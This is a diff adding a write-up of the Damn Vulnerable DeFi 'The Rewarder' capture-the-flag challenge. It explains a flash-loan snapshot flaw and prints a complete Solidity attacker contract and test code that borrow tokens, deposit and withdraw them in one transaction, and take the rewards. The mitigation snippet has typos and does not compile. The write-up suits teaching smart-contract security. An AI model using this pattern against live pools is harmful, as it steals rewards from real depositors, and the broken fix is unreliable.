@@ -270,3 +270,98 @@ Hack inside `side-entrance.challenge.js`
 ### Mitigation
 
 Use reentrancy modifiers to restrict a `deposit` call from the `flashLoan` function
+
+## Challenge #5 - The Rewarder
+There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
+
+Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
+
+You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
+
+By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?
+
+### `TheRewarderPool.sol`: Pool is vulnerable to flash loan attacks when malicious user deposits loaned tokens and then withdraws them at the same transaction
+
+Pool uses `ERC20snapshot` token which allows to make a snaphot of a current period total supply and balances. This snapshot is made upon depositing to the pool, as a result we can loan some tokens deposit them which leads to a snapshot update and then withdraw them without losing our future reward.
+
+### Proof of concept 
+
+Attacker's contract
+
+```
+// SPDX-License-Identifier: MIT
+
+import "../the-rewarder/FlashLoanerPool.sol";
+import "../the-rewarder/TheRewarderPool.sol";
+
+pragma solidity ^0.8.0;
+
+contract RewarderExploit {
+    FlashLoanerPool public immutable loanPool;
+    TheRewarderPool public immutable rewardPool;
+    ERC20 public immutable DVT;
+    ERC20 public immutable rewardToken;
+
+    constructor (FlashLoanerPool _loanPool, TheRewarderPool _rewardPool, ERC20 _DVT, ERC20 _rewardToken) {
+        loanPool = _loanPool;
+        rewardPool = _rewardPool;
+        DVT = _DVT;
+        rewardToken = _rewardToken;
+    }
+
+    function attack() public {
+        uint256 bal = DVT.balanceOf(address(loanPool));
+        loanPool.flashLoan(bal);
+        
+        bal = rewardToken.balanceOf(address(this));
+        rewardToken.transfer(msg.sender, bal);
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        DVT.approve(address(rewardPool), type(uint256).max);
+        
+        rewardPool.deposit(amount);
+        rewardPool.withdraw(amount);
+        
+        DVT.transfer(address(loanPool), amount);
+    }
+}
+```
+
+Usage in test file `the-rewarder.challenge.js`
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('RewarderExploit');
+        exploit = await Exploit.deploy(
+            flashLoanPool.address,
+            rewarderPool.address,
+            liquidityToken.address,
+            rewardToken.address
+        );
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        await exploit.connect(player).attack();
+    });
+```
+
+### Mitigation
+
+We can add a cooldown period, so users cannot withdraw tokens from the pool at the same transaction
+
+```
+uint256 private _cooldown;
+mapping(address => uint256) private _lastDepositCall;
+
+function deposit(uint256 amount) external {
+    _lastDepositCall[msg.sender] = block.timestamp
+    ...
+```
+```
+function withdraw(uint256 amount) external {
+    if(block.timestamp - _lastDepositCall[msg.sender] < cooldow) revert onCooldown();
+    ...
+```
+
